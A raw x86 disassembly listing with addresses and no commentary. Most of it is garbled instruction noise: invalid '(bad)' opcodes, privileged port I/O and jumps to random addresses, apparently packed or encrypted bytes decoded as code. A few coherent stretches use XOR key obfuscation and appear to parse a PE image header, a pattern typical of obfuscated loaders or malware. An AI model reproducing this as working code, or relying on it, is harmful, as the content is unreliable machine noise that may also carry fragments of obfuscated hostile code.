  40bd19:	mov    ebx,0xe8362f83
  40bd1e:	aad    0xa7
  40bd20:	mov    WORD PTR [eax],cs
  40bd22:	outs   dx,DWORD PTR ds:[esi]
  40bd23:	push   esp
  40bd24:	scas   eax,DWORD PTR es:[edi]
  40bd25:	mov    esp,0xe9634b19
  40bd2a:	cmp    eax,0x2a1455df
  40bd2f:	mov    edx,0x9fdc75ec
  40bd34:	clc    
  40bd35:	mov    edi,0x4ab0d035
  40bd3a:	inc    eax
  40bd3b:	cli    
  40bd3c:	mov    bl,0xb0
  40bd3e:	adc    bl,cl
  40bd40:	push   edx
  40bd41:	ret    
  40bd42:	sar    BYTE PTR [esi-0x424eee92],1
  40bd48:	mov    ah,0xe0
  40bd4a:	(bad)
  40bd50:	mov    ebp,0x4848fb7e
  40bd55:	jmp    0x9200:0x6fbde1b6
  40bd5c:	sbb    BYTE PTR [edx-0x7a46389e],0x25
  40bd63:	out    0x17,al
  40bd65:	hlt    
  40bd66:	cli    
  40bd67:	dec    edi
  40bd68:	dec    edi
  40bd69:	inc    edx
  40bd6a:	loope  0x40bd59
  40bd6c:	dec    edi
  40bd6d:	sub    BYTE PTR [eax],0x85
  40bd70:	pushf  
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz mov ecx,0xb9355778
  40bd90:	cld    
  40bd91:	jle    0x40be11
  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40be10
  40bd98:	push   eax
  40bd99:	cmp    cl,BYTE PTR [ebp-0x42]
  40bd9c:	lods   eax,DWORD PTR ds:[esi]
  40bd9d:	stc    
  40bd9e:	adc    DWORD PTR [ebp+0x1a9ef7f4],edx
  40bda4:	adc    BYTE PTR [ebx+ecx*2-0x3017de19],dl
  40bdab:	dec    ebp
  40bdac:	push   esi
  40bdad:	mov    esi,0x1eaa511c
  40bdb2:	xlat   BYTE PTR ds:[ebx]
  40bdb4:	cmp    eax,0x83bd8a16
  40bdb9:	ins    BYTE PTR es:[edi],dx
  40bdba:	jne    0x40bd7d
  40bdbc:	out    0x1c,al
  40bdbe:	sbb    cl,BYTE PTR [esp+edx*8-0x527455ee]
  40bdc5:	mov    DWORD PTR [esi],esi
  40bdc7:	lock push 0x21
  40bdca:	jecxz  0x40bdae
  40bdcc:	pushf  
  40bdcd:	cmp    eax,DWORD PTR [edi-0x3de01f78]
  40bdd3:	arpl   WORD PTR [ebx+0x6b],cx
  40bdd6:	push   edx
  40bdd7:	adc    al,0x6b
  40bdd9:	xor    DWORD PTR [ecx],0x29
  40bddc:	jl     0x40bd97
  40bdde:	sub    DWORD PTR [edx+ebp*4],ebp
  40bde1:	sub    al,0x64
  40bde3:	aad    0x83
  40bde5:	dec    esp
  40bde6:	xchg   edx,eax
  40bde7:	enter  0xe133,0xe2
  40bdeb:	std    
  40bdec:	cmp    BYTE PTR [edx],0x53
  40bdef:	push   eax
  40bdf0:	sub    DWORD PTR [edi],esi
  40bdf2:	and    al,0xfe
  40bdf4:	aam    0xf7
  40bdf6:	(bad)  
  40bdf7:	repnz les edx,FWORD PTR [edi]
  40bdfa:	pop    ebp
  40bdfb:	or     eax,eax
  40bdfd:	mov    BYTE PTR [eax-0x6f],dl
  40be00:	jnp    0x40be5a
  40be02:	fdivr  DWORD PTR [ebx-0x7f]
  40be05:	xchg   esi,eax
  40be06:	out    0x5c,eax
  40be08:	or     eax,0xa8a61ee7
  40be0d:	and    ch,al
  40be0f:	jmp    0x40bd9e
  40be11:	sbb    DWORD PTR [ecx],0x2b9ccb7
  40be17:	jmp    0x78fb3ff3
  40be1c:	ins    BYTE PTR es:[edi],dx
  40be1d:	imul   esi,DWORD PTR [ebp+0x46d68caa],0x6c
  40be24:	retf   
  40be25:	sub    al,0x97
  40be27:	std    
  40be28:	repnz xchg esp,eax
  40be2a:	dec    ebp
  40be2b:	xchg   BYTE PTR [ebx+eiz*8],bh
  40be2e:	and    ebp,DWORD PTR [edi+eiz*1]
  40be31:	pop    esi
  40be32:	cmp    al,0x5a
  40be34:	cmc    
  40be35:	mov    DWORD PTR [esi+esi*2],edi
  40be38:	out    dx,eax
  40be39:	push   ebx
  40be3a:	mov    ebp,0x172b436e
  40be3f:	lea    esi,[edi+0x2eee9490]
  40be45:	push   ss
  40be46:	ja     0x40be65
  40be48:	test   ah,al
  40be4a:	inc    ebx
  40be4b:	mov    edx,0x8bca6746
  40be50:	in     eax,dx
  40be51:	or     al,BYTE PTR [edx+eax*1-0x11026822]
  40be58:	mov    ds:0xc0bab9f2,al
  40be5d:	add    eax,0x632a7287
  40be62:	jne    0x40beb5
  40be64:	pop    ds
  40be65:	mov    esi,ds
  40be67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be68:	xor    al,0x48
  40be6a:	das    
  40be6b:	shl    DWORD PTR [edx+0x56],1
  40be6e:	das    
  40be6f:	xchg   DWORD PTR ds:0x6c4306b2,esi
  40be75:	push   0xffffff8e
  40be77:	xor    al,0x58
  40be79:	bound  ecx,QWORD PTR [edi+ebp*8]
  40be7c:	xlat   BYTE PTR ds:[ebx]
  40be7d:	xor    esi,DWORD PTR [ecx-0x95e05d1]
  40be83:	popf   
  40be84:	jb     0x40be9c
  40be86:	add    eax,0x23427b22
  40be8b:	cmc    
  40be8c:	mov    BYTE PTR [edi+0x5a],ch
  40be8f:	mov    ah,0x85
  40be91:	pushf  
  40be92:	outs   dx,BYTE PTR cs:[esi]
  40be94:	aaa    
  40be95:	push   eax
  40be96:	mov    ebp,0x97acf7b2
  40be9b:	sub    edx,DWORD PTR [ecx+0x2b]
  40be9e:	dec    esi
  40be9f:	mov    esp,0x7c66229d
  40bea4:	test   DWORD PTR [ebp+0x18362b0e],ebx
  40beaa:	ret    0x7199
  40bead:	mov    al,ds:0x438e858d
  40beb2:	push   ss
  40beb3:	in     eax,0x38
  40beb5:	les    ebx,FWORD PTR [edi-0x63]
  40beb8:	jo     0x40be5d
  40beba:	cmc    
  40bebb:	shl    DWORD PTR [esi],1
  40bebd:	mov    ch,0x0
  40bebf:	add    BYTE PTR [eax],al
  40bec1:	sar    dh,cl
  40bec3:	add    ah,BYTE PTR ds:0xd1dd0708
  40bec9:	mov    WORD PTR [edx+ecx*8+0x1],ss
  40becd:	or     al,0x73
  40becf:	stos   BYTE PTR es:[edi],al
  40bed0:	and    dl,BYTE PTR [ebp+0x2b56bde2]
  40bed6:	aad    0x2d
  40bed8:	push   cs
  40bed9:	ds mov ah,0x23
  40bedc:	or     al,BYTE PTR [esi]
  40bede:	sub    eax,0xe80ac88f
  40bee3:	add    BYTE PTR [ebp+0x3a],dl
  40bee6:	imul   edi,DWORD PTR [edi-0x36],0x837ce5f4
  40beed:	mov    gs,eax
  40beef:	adc    ebp,DWORD PTR [esi-0x1e]
  40bef2:	jb     0x40be75
  40bef4:	cld    
  40bef5:	jecxz  0x40bebc
  40bef7:	imul   edx,DWORD PTR [ebx],0x31
  40befa:	daa    
  40befb:	out    dx,al
  40befc:	dec    ecx
  40befd:	clc    
  40befe:	pop    edi
  40beff:	sar    BYTE PTR [eax+0x50],1
  40bf02:	gs fs pusha 
  40bf05:	sbb    al,BYTE PTR [esi-0x218819ed]
  40bf0b:	dec    edx
  40bf0c:	or     al,0xb0
  40bf0e:	aad    0x26
  40bf10:	ret    
  40bf11:	mov    ds:0x49e4a29b,eax
  40bf16:	pop    ebx
  40bf17:	loopne 0x40bee1
  40bf19:	inc    DWORD PTR [edi]
  40bf1b:	(bad)  
  40bf1c:	movhps xmm2,QWORD PTR [edi-0x35]
  40bf20:	mov    edx,0xa9581753
  40bf25:	rcl    DWORD PTR [edx],cl
  40bf27:	jns    0x40bf08
  40bf29:	out    0x24,eax
  40bf2b:	pop    esi
  40bf2c:	jecxz  0x40bf66
  40bf2e:	inc    esi
  40bf2f:	dec    esp
  40bf30:	adc    eax,0xfea0c0e5
  40bf35:	and    eax,edi
  40bf37:	mov    BYTE PTR [ebx-0x52],ah
  40bf3a:	xor    DWORD PTR [edx-0x1b],0xffffffa8
  40bf3e:	hlt    
  40bf3f:	frstor [edi+0x4d33a2b9]
  40bf45:	jmp    0x7a99371b
  40bf4a:	jne    0x40bf62
  40bf4c:	fadd   st,st(1)
  40bf4e:	sbb    edx,ebp
  40bf50:	push   0x6a
  40bf52:	loope  0x40bf62
  40bf54:	cwde   
  40bf55:	lods   al,BYTE PTR ds:[esi]
  40bf56:	sub    ch,dh
  40bf58:	jae    0x40bf0a
  40bf5a:	and    esp,edx
  40bf5c:	repz (bad) 
  40bf5e:	mul    DWORD PTR [ebp+0x73c06664]
  40bf64:	in     al,0x30
  40bf66:	adc    ecx,DWORD PTR [edi-0x16e6ffdd]
  40bf6c:	pusha  
  40bf6d:	xchg   esi,eax
  40bf6e:	and    al,0xe7
  40bf70:	retf   0xfe56
  40bf73:	hlt    
  40bf74:	leave  
  40bf75:	(bad)  
  40bf76:	pusha  
  40bf77:	pop    esi
  40bf78:	and    cl,BYTE PTR [edx]
  40bf7a:	out    0x9d,al
  40bf7c:	fs dec ebx
  40bf7e:	out    0xe1,al
  40bf80:	(bad)  
  40bf81:	adc    eax,0xced01dcd
  40bf86:	mov    ah,0xa0
  40bf88:	sbb    DWORD PTR [ebx],ebx
  40bf8a:	cwde   
  40bf8b:	ds (bad) 
  40bf8d:	int3   
  40bf8e:	ret    
  40bf8f:	or     al,BYTE PTR [eax+0x11]
  40bf92:	retf   0x2f91
  40bf95:	fnsave [ecx]
  40bf97:	test   BYTE PTR [ecx+0x11277c36],ch
  40bf9d:	push   ss
  40bf9e:	ret    0x464c
  40bfa1:	test   esp,0x58993aa3
  40bfa7:	sbb    bl,BYTE PTR [edi+0x716f05bf]
  40bfad:	or     BYTE PTR [esi],al
  40bfaf:	add    al,0x61
  40bfb1:	xchg   ebp,eax
  40bfb2:	inc    edi
  40bfb3:	jnp    0x40c029
  40bfb5:	or     al,0xc3
  40bfb7:	xor    eax,0x59f3a1bc
  40bfbc:	in     eax,0x3d
  40bfbe:	pop    ds
  40bfbf:	xchg   edi,eax
  40bfc0:	fiadd  WORD PTR [ecx+0x66]
  40bfc3:	cs popf 
  40bfc5:	mov    DWORD PTR [esi+0x61a02cd5],ebx
  40bfcb:	cli    
  40bfcc:	cmp    ch,BYTE PTR [ebx-0x76]
  40bfcf:	xor    ecx,ebx
  40bfd1:	xchg   DWORD PTR [ebp+0x66],ebx
  40bfd4:	jns    0x40bf6c
  40bfd6:	ret    
  40bfd7:	inc    eax
  40bfd8:	ficomp WORD PTR [ebx+0x20]
  40bfdb:	in     al,0x3e
  40bfdd:	in     al,dx
  40bfde:	push   ss
  40bfdf:	add    eax,0xab3baaf3
  40bfe4:	pop    edi
  40bfe5:	dec    ebp
  40bfe6:	ins    BYTE PTR es:[edi],dx
  40bfe7:	xchg   ecx,eax
  40bfe8:	std    
  40bfe9:	mov    ebx,0xd41da14b
  40bfee:	add    DWORD PTR [esi],0x8a75bbfa
  40bff4:	adc    al,0x6d
  40bff6:	cs mov edx,0xbbfc5474
  40bffc:	(bad)  
  40bffd:	and    DWORD PTR [ebx+0xc],eax
  40c000:	out    0xf3,eax
  40c002:	push   ecx
  40c003:	push   edi
  40c004:	mov    ah,0xe5
  40c006:	ins    DWORD PTR es:[edi],dx
  40c007:	jmp    0xff50848f
  40c00c:	xor    esi,edi
  40c00e:	lods   eax,DWORD PTR ds:[esi]
  40c00f:	jmp    0x40c074
  40c011:	dec    esp
  40c012:	repnz out 0x0,eax
  40c015:	mov    edx,0xc6bef698
  40c01a:	mov    eax,ds:0x773f1e61
  40c01f:	push   ss
  40c020:	push   es
  40c021:	or     bh,BYTE PTR [edx-0x14]
  40c024:	mov    edx,0x38eb1dd3
  40c029:	xor    ebp,esp
  40c02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c02c:	call   FWORD PTR [edx+0x7cadcbb4]
  40c032:	scas   eax,DWORD PTR es:[edi]
  40c033:	(bad)  
  40c036:	mov    ecx,0xc532a0f5
  40c03b:	cmc    
  40c03c:	fidiv  WORD PTR [edx-0x504072a1]
  40c042:	xor    ch,al
  40c044:	and    eax,0xaa8efc11
  40c049:	and    DWORD PTR [edx+0x41],esp
  40c04c:	test   al,0x65
  40c04e:	out    dx,al
  40c04f:	out    dx,al
  40c050:	rcl    edx,0x22
  40c053:	mov    bl,0x9f
  40c055:	and    DWORD PTR [ebx],ebx
  40c057:	aad    0xf2
  40c059:	mov    edi,0x75d8b6f5
  40c05e:	test   eax,0x91c45ad2
  40c063:	sub    ch,bl
  40c065:	inc    ah
  40c067:	shr    BYTE PTR [eax-0x27],1
  40c06a:	cmp    eax,0x56d57c2e
  40c06f:	stos   BYTE PTR es:[edi],al
  40c070:	sub    edx,DWORD PTR fs:[ebx]
  40c073:	jnp    0x40c031
  40c075:	xor    eax,0x672aa1a1
  40c07a:	ds mov ebp,0x80407b29
  40c080:	aaa    
  40c081:	pop    esi
  40c082:	jno    0x40c0dc
  40c084:	cmp    al,0x4c
  40c086:	das    
  40c087:	xor    DWORD PTR [edx+0x50],ebp
  40c08a:	mov    dl,0x92
  40c08c:	sbb    ebp,DWORD PTR [ebx]
  40c08e:	push   es
  40c08f:	lahf   
  40c090:	cwde   
  40c091:	call   0xaeb26ac1
  40c096:	xchg   edx,eax
  40c097:	and    ebp,ebp
  40c099:	rcl    BYTE PTR [eax-0x33],0xea
  40c09d:	mov    DWORD PTR [ebx+0x2622e4ea],eax
  40c0a3:	(bad)  
  40c0a4:	aad    0x77
  40c0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0a7:	ret    0xd10d
  40c0aa:	int    0x48
  40c0ac:	xchg   esp,eax
  40c0ad:	xchg   BYTE PTR [edx],bh
  40c0af:	jo     0x40c0d4
  40c0b1:	jp     0x40c036
  40c0b3:	mov    eax,DWORD PTR [edi+eax*8-0x12]
  40c0b7:	sbb    BYTE PTR [edx-0xc],ah
  40c0ba:	pop    ebp
  40c0bb:	(bad)  
  40c0bc:	sub    eax,0x81844a94
  40c0c1:	pusha  
  40c0c2:	jae    0x40c0dc
  40c0c4:	mov    cl,0x61
  40c0c6:	outs   dx,DWORD PTR ds:[esi]
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	call   FWORD PTR [ebx-0x4964833]
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c15e
  40c110:	rol    DWORD PTR [esi],cl
  40c112:	inc    edi
  40c113:	xor    BYTE PTR [esi+0x5f1ab1ff],bh
  40c119:	pop    ecx
  40c11a:	inc    edx
  40c11b:	pop    edi
  40c11c:	adc    DWORD PTR [edi-0x60],0xffffffc4
  40c120:	lods   al,BYTE PTR ds:[esi]
  40c121:	sbb    eax,eax
  40c123:	outs   dx,DWORD PTR ds:[esi]
  40c124:	cwde   
  40c125:	push   esi
  40c126:	ja     0x40c0dd
  40c128:	es shr cl,cl
  40c12b:	or     al,0x66
  40c12d:	cwde   
  40c12e:	jl     0x40c12b
  40c130:	lds    eax,FWORD PTR [ebx+0xf46149]
  40c136:	jg     0x40c0cb
  40c138:	mov    cl,0xd3
  40c13a:	or     DWORD PTR [edi+0x695830e8],0x6d
  40c141:	jp     0x40c19f
  40c143:	aaa    
  40c144:	push   esi
  40c145:	idiv   DWORD PTR [edi-0x2b]
  40c148:	pop    es
  40c149:	and    eax,DWORD PTR [ebx+0x5b]
  40c14c:	inc    esp
  40c14d:	and    dl,bh
  40c14f:	mov    ebx,gs
  40c151:	cmp    al,0xf3
  40c153:	jle    0x40c15a
  40c155:	dec    esi
  40c156:	push   ecx
  40c157:	add    DWORD PTR [ebx],esi
  40c159:	retf   
  40c15a:	fimul  DWORD PTR [ebx+eiz*2-0x78]
  40c15e:	push   esi
  40c15f:	add    eax,0xfb591efe
  40c164:	enter  0xf2e4,0xb4
  40c168:	or     ecx,ecx
  40c16a:	loop   0x40c1c8
  40c16c:	pop    es
  40c16d:	addr16 test edx,edi
  40c170:	(bad)  
  40c171:	fsub   st(5),st
  40c173:	xor    al,0x7
  40c175:	cwde   
  40c176:	adc    esi,esi
  40c178:	jecxz  0x40c11a
  40c17a:	sbb    cl,BYTE PTR [esi+0x7d]
  40c17d:	sbb    al,0x2c
  40c17f:	stos   BYTE PTR es:[edi],al
  40c180:	mov    bh,0xd1
  40c182:	(bad)  
  40c183:	sbb    BYTE PTR [eax-0x4e],0x25
  40c187:	or     ah,BYTE PTR [ecx+eiz*8+0x16]
  40c18b:	call   0x86c4233e
  40c190:	test   dh,cl
  40c192:	pand   mm4,QWORD PTR [ebx]
  40c195:	mov    BYTE PTR [ebx],cl
  40c197:	ins    DWORD PTR es:[edi],dx
  40c198:	ds push ebp
  40c19a:	jge    0x40c167
  40c19c:	fist   WORD PTR [edi-0x56]
  40c19f:	into   
  40c1a0:	pop    ebp
  40c1a1:	jg     0x40c206
  40c1a3:	es jecxz 0x40c1af
  40c1a6:	out    0x68,eax
  40c1a8:	ret    
  40c1a9:	leave  
  40c1aa:	xchg   esi,eax
  40c1ab:	mov    dl,0xb2
  40c1ad:	adc    DWORD PTR [ebx],esi
  40c1af:	jns    0x40c1c3
  40c1b1:	xchg   DWORD PTR [edx],ecx
  40c1b3:	xor    al,0xc8
  40c1b5:	pushf  
  40c1b6:	fnsave [edx+0x23d9cca0]
  40c1bc:	and    bh,BYTE PTR [ecx+0x1e]
  40c1bf:	jecxz  0x40c1d7
  40c1c1:	add    al,0x25
  40c1c3:	mov    dl,BYTE PTR [ebx]
  40c1c5:	push   ss
  40c1c6:	or     al,0x89
  40c1c9:	or     al,0x1c
  40c1cb:	daa    
  40c1cc:	dec    ebp
  40c1cd:	lods   al,BYTE PTR ds:[esi]
  40c1ce:	fdivr  DWORD PTR [ebx]
  40c1d0:	pushf  
  40c1d1:	or     al,0x5f
  40c1d4:	scas   al,BYTE PTR es:[edi]
  40c1d5:	and    ch,BYTE PTR [edi-0x7bafb897]
  40c1db:	stos   DWORD PTR es:[edi],eax
  40c1dc:	push   ss
  40c1dd:	or     eax,0x3603d8a9
  40c1e2:	not    DWORD PTR [ebp+0x664fcb4d]
  40c1e8:	(bad)  
  40c1e9:	cmp    al,0xa7
  40c1eb:	mov    al,ds:0x8f58fc90
  40c1f0:	push   ebp
  40c1f1:	bound  ebx,QWORD PTR fs:[ecx]
  40c1f4:	dec    esp
  40c1f5:	or     ebx,edi
  40c1f7:	cld    
  40c1f8:	xchg   esi,eax
  40c1f9:	rcl    BYTE PTR [eax+eiz*2-0xaf4f8c7],0x83
  40c201:	inc    esp
  40c202:	pop    edi
  40c203:	sar    DWORD PTR [eax+0xa6be8ad],0x38
  40c20a:	dec    esp
  40c20b:	fs cli 
  40c20d:	ror    BYTE PTR [ecx+0x22d02739],cl
  40c213:	gs aas 
  40c215:	shl    BYTE PTR [edx],cl
  40c217:	mov    dh,dh
  40c219:	call   0x29923857
  40c21e:	popf   
  40c21f:	mov    ebx,0xd15f3649
  40c224:	mov    BYTE PTR [ecx-0x607461a6],ch
  40c22a:	xchg   esp,ebx
  40c22c:	bnd jge 0x40c212
  40c22f:	inc    ecx
  40c230:	xchg   edi,eax
  40c231:	hlt    
  40c232:	jnp    0x40c24e
  40c234:	stos   DWORD PTR es:[edi],eax
  40c235:	ja     0x40c21a
  40c237:	ja     0x40c1d4
  40c239:	mov    eax,0xedbda78b
  40c23e:	jns    0x40c28b
  40c240:	and    eax,0x894bb01f
  40c245:	cmp    bl,BYTE PTR [ebx]
  40c247:	mov    al,0x37
  40c249:	adc    ebp,DWORD PTR [edx+0x5f]
  40c24c:	nop
  40c24d:	stos   DWORD PTR es:[edi],eax
  40c24e:	or     BYTE PTR [eax-0x98b1790],bh
  40c254:	cmp    DWORD PTR [edx],0xffffffd9
  40c257:	sbb    DWORD PTR [eax+eiz*2],eax
  40c25a:	sub    DWORD PTR [edx+0x5c],ebp
  40c25d:	cdq    
  40c25e:	iret   
  40c25f:	in     al,0x90
  40c261:	mov    dh,0x16
  40c263:	and    bh,BYTE PTR [eax]
  40c265:	inc    esp
  40c266:	call   0xfcf1ec35
  40c26b:	hlt    
  40c26c:	mov    ah,0x57
  40c26e:	mov    edi,0x3aee98b7
  40c273:	sub    ebp,DWORD PTR es:0x935e992c
  40c27a:	pop    ecx
  40c27b:	push   es
  40c27c:	xchg   edx,eax
  40c27d:	cwde   
  40c27e:	xchg   esp,eax
  40c27f:	sub    eax,0xc03149a8
  40c284:	mov    al,ds:0xfe3fb194
  40c289:	jmp    0x40c22a
  40c28b:	in     al,dx
  40c28c:	jg     0x40c21b
  40c28e:	rol    BYTE PTR [eax],cl
  40c290:	fdivr  DWORD PTR [edx]
  40c292:	sar    DWORD PTR [eax+0x5317ad34],0x95
  40c299:	jbe    0x40c25b
  40c29b:	sbb    DWORD PTR [eax-0x4c],edx
  40c29e:	adc    ecx,DWORD PTR [esi-0x596feca2]
  40c2a4:	shr    DWORD PTR [edi+0x2],cl
  40c2a7:	jno    0x40c29f
  40c2a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2aa:	lock (bad) 
  40c2ac:	and    al,0xc1
  40c2ae:	xchg   esi,eax
  40c2af:	leave  
  40c2b0:	int3   
  40c2b1:	out    dx,eax
  40c2b2:	into   
  40c2b3:	addr16 call 0x961cd33f
  40c2b9:	or     eax,0x98758918
  40c2be:	pusha  
  40c2bf:	xor    BYTE PTR [eax],bl
  40c2c1:	fist   DWORD PTR ds:0x4a134cdd
  40c2c7:	mov    bl,0x16
  40c2c9:	sub    eax,0x89d95cda
  40c2ce:	leave  
  40c2cf:	test   BYTE PTR es:[edx+0x1f61fa3],ah
  40c2d6:	push   esp
  40c2d7:	outs   dx,DWORD PTR ds:[esi]
  40c2d8:	and    BYTE PTR [edi+0x30],bh
  40c2db:	clc    
  40c2dc:	int3   
  40c2dd:	push   ss
  40c2de:	xchg   ebp,eax
  40c2df:	push   esp
  40c2e0:	jmp    0x40c2d2
  40c2e2:	cmp    eax,0x6f501128
  40c2e7:	ret    
  40c2e8:	push   0x6e8ee539
  40c2ed:	ret    0x5234
  40c2f0:	cmp    ch,BYTE PTR [esi-0x6]
  40c2f3:	js     0x40c2eb
  40c2f5:	xor    BYTE PTR [ebp+0x29],dh
  40c2f8:	jno    0x40c309
  40c2fa:	in     eax,dx
  40c2fb:	push   0xffffffdc
  40c2fd:	sub    DWORD PTR [ecx+0x59],edi
  40c300:	mov    esi,0x699c0ecd
  40c305:	out    dx,eax
  40c306:	jmp    0x40c33a
  40c308:	xchg   esi,eax
  40c309:	aas    
  40c30a:	mov    es,WORD PTR [edi+0x3c8ed7ec]
  40c310:	sub    eax,0x23c18e90
  40c315:	fsub   DWORD PTR [ecx-0x1f]
  40c318:	(bad)  [esp+ecx*4+0x73]
  40c31c:	xchg   ecx,eax
  40c31d:	out    dx,al
  40c31e:	clc    
  40c31f:	xchg   esp,eax
  40c320:	ror    DWORD PTR [ebx],0x42
  40c323:	or     BYTE PTR [esi+ecx*4+0x4c46b5b1],cl
  40c32a:	hlt    
  40c32b:	test   eax,0xcbe448ad
  40c330:	les    ecx,FWORD PTR [edi+0x16]
  40c333:	push   ebx
  40c334:	pushf  
  40c335:	inc    ebp
  40c336:	cmp    al,0xf1
  40c338:	xchg   DWORD PTR [eax+edi*4-0x59],ecx
  40c33c:	retf   0x71d9
  40c33f:	jmp    0x40c36b
  40c341:	dec    esp
  40c342:	mov    DWORD PTR [eax],edx
  40c344:	js     0x40c352
  40c346:	stos   DWORD PTR es:[edi],eax
  40c347:	lea    ebp,[edx+0xef46ee9]
  40c34d:	mov    eax,ds:0xeb476975
  40c352:	dec    BYTE PTR [ecx+0x22]
  40c355:	rcr    BYTE PTR [esi+0x5830be6a],1
  40c35b:	jle    0x40c3d1
  40c35d:	push   ds
  40c35e:	(bad)  
  40c360:	jne    0x40c2fc
  40c362:	inc    edx
  40c363:	xchg   ebp,eax
  40c364:	(bad)  
  40c365:	mov    DWORD PTR [edi+0xe5141ac],edi
  40c36b:	pop    esi
  40c36c:	adc    eax,0x97506770
  40c371:	(bad)
  40c374:	sbb    BYTE PTR [ebp+ebx*2-0x4f],bh
  40c378:	inc    eax
  40c379:	into   
  40c37a:	pop    eax
  40c37b:	adc    eax,0x7d6aa69c
  40c380:	mov    edi,0x32b18368
  40c385:	call   0xff5545b7
  40c38a:	ror    dl,0x27
  40c38d:	sbb    eax,0xa2e39892
  40c392:	pop    edi
  40c393:	ja     0x40c3a5
  40c395:	mov    cl,al
  40c397:	and    dh,BYTE PTR [esi+0x55]
  40c39a:	pop    ebp
  40c39b:	or     al,0xf0
  40c39d:	pop    es
  40c39e:	mov    dh,0xab
  40c3a0:	mov    bh,BYTE PTR [ecx-0x4a62aa68]
  40c3a6:	inc    ebx
  40c3a7:	mov    ecx,0xdf87424
  40c3ac:	repz or DWORD PTR [edx+0x7041eea7],ebp
  40c3b3:	or     esi,DWORD PTR [edi+0x3c]
  40c3b6:	mov    edi,0xe86ee5fd
  40c3bb:	shl    DWORD PTR [eax+0x60],1
  40c3be:	mov    ebx,0xc9c43f56
  40c3c3:	scas   eax,DWORD PTR es:[edi]
  40c3c4:	and    eax,0x7b94e24e
  40c3c9:	shl    DWORD PTR [ebx+0x19ee0d7a],0xfa
  40c3d0:	jns    0x40c3ae
  40c3d2:	das    
  40c3d3:	push   es
  40c3d4:	jmp    0x40c39e
  40c3d6:	je     0x40c3e5
  40c3d8:	or     edi,DWORD PTR [eax]
  40c3da:	dec    esp
  40c3db:	jle    0x40c397
  40c3dd:	cs xor al,0x63
  40c3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e1:	push   es
  40c3e2:	clc    
  40c3e3:	inc    esp
  40c3e4:	sbb    DWORD PTR [edi+0x69],esi
  40c3e7:	mov    al,0x91
  40c3e9:	pop    ebx
  40c3ea:	adc    DWORD PTR [eax+0x61],0xfffffff1
  40c3ee:	push   esi
  40c3ef:	sub    dh,BYTE PTR [ecx]
  40c3f1:	xchg   edx,eax
  40c3f2:	sti    
  40c3f3:	dec    esi
  40c3f4:	cmp    al,0x47
  40c3f6:	mov    dh,0xe7
  40c3f8:	sbb    ah,BYTE PTR [ebp-0x3ee510e2]
  40c3fe:	out    dx,eax
  40c3ff:	popa   
  40c400:	repnz (bad) 
  40c402:	jg     0x40c3eb
  40c404:	outs   dx,BYTE PTR ds:[esi]
  40c405:	mov    dl,BYTE PTR [edx]
  40c407:	mov    eax,0x73288683
  40c40c:	clc    
  40c40d:	push   ss
  40c40e:	aam    0xa6
  40c410:	cwde   
  40c411:	mov    ch,0xf6
  40c413:	and    BYTE PTR [ebp+0x5e],dl
  40c416:	fnsave [ecx]
  40c418:	mov    ds:0x2c13dee2,al
  40c41d:	add    eax,DWORD PTR [ecx-0x47]
  40c420:	sbb    dl,BYTE PTR [esi-0x4d223c3b]
  40c426:	(bad)  
  40c427:	xlat   BYTE PTR ds:[ebx]
  40c428:	xor    eax,0xc632f9a8
  40c42d:	add    al,0xac
  40c42f:	cmp    edi,DWORD PTR [edi+0x38bba05d]
  40c435:	cmp    BYTE PTR [ebp-0x37],bl
  40c438:	add    edx,ecx
  40c43a:	xor    al,0xca
  40c43c:	add    edi,edi
  40c43e:	test   al,0x8d
  40c440:	test   BYTE PTR [eax],cl
  40c442:	fwait
  40c443:	jb     0x40c477
  40c445:	add    BYTE PTR [esi-0x77],ah
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x3a]
